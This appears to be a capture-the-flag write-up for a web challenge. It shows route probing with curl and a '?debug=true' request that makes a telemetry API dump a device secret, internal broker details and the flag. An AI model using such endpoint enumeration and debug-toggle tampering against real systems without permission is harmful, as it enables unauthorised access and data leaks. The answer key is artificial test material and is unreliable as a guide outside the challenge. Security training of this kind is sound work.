---
title: "Silent Telemetry"
ctf: "Lun4R CTF Finale // KumoSec Red Team Operations"
date: 2026-10-03
category: web
difficulty: easy
points: null
flag_format: "Lun4R{...}"
author: "sokhiaryan"
---

# Silent Telemetry

## Summary

A fake IoT "Device Security Console" at `telemetry.kumosec.rootriet.in` exposes a `/debug` endpoint that claims debug mode is disabled; passing `?debug=true` flips it on and the backend dumps internal diagnostics, including the flag, directly in the JSON response.

## Solution

### Step 1: Recon the backend surface

The landing page is a static-looking dashboard (temperature/humidity bars, connectivity status) with no linked JS bundles, so the API has to be hidden routes rather than client code. Requesting a non-existent path returns a JSON 404 (`{"error":"endpoint not found"}`), confirming a lightweight JSON API (Flask-style) sits behind nginx. Probing a short list of likely route names turns up three live endpoints:

```bash
for p in debug api/telemetry api/status api/logs admin config; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://telemetry.kumosec.rootriet.in/$p")
  echo "$code $p"
done
# 200 debug
# 200 api/telemetry
# 200 api/status
# 404 everything else
```

`/debug` responds with:

```json
{"device":"Lun4R-ENV-042","firmware":"1.4.7","message":"Debug mode is disabled.","status":"debug interface"}
```

A route that explicitly announces it's "disabled" rather than 404ing is the tell — it's gated by a parameter, not actually removed. This matches the challenge flavor text: most traces (query params/toggles) say nothing, but one flips a real switch.

### Step 2: Flip the switch

```bash
curl -s "http://telemetry.kumosec.rootriet.in/debug?debug=true"
```

```json
{
  "debug": true,
  "device": "Lun4R-ENV-042",
  "device_secret": "env_sensor_debug_7f3a",
  "diagnostics": {"flash": "OK", "sensor_bus": "OK", "telemetry_queue": "3 pending"},
  "environment": "production",
  "firmware": "1.4.7",
  "flag": "Lun4R{d3v1c3_0wn3d}",
  "model": "ENV-SENSE Mk II",
  "mqtt_broker": "mqtt://broker.internal"
}
```

The string `"true"` is enough to satisfy the server's (loose) truthiness check on the `debug` query param, enabling a verbose diagnostics branch that was never meant to be reachable in production and leaks the flag along with internal device/broker details.

## Flag

```
Lun4R{d3v1c3_0wn3d}
```
